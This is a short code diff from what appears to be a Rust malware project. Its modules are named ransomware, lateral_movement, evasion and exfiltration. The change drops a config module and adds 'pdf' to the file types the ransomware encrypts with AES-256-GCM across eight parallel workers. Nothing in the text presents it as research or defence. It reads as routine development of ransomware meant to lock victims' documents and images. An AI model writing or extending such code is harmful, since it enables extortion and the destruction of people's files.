@@ -5,7 +5,6 @@ mod ransomware;
 mod windows;
 mod lateral_movement;
 mod evasion;
-mod config;
 mod linux;
 mod exfiltration;
 
@@ -141,7 +140,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                     files.clone(),
                     ransomware::RansomwareConfig {
                         target_paths: vec![path.clone()],
-                        file_extensions: vec!["txt", "doc", "docx", "xls", "xlsx", "jpg", "png"].iter().map(|s| s.to_string()).collect(),
+                        file_extensions: vec!["txt", "doc", "docx", "xls", "xlsx", "jpg", "png", "pdf"].iter().map(|s| s.to_string()).collect(),
                         encryption_algorithm: "aes-256-gcm".to_string(),
                         max_parallelism: 8,
                     },
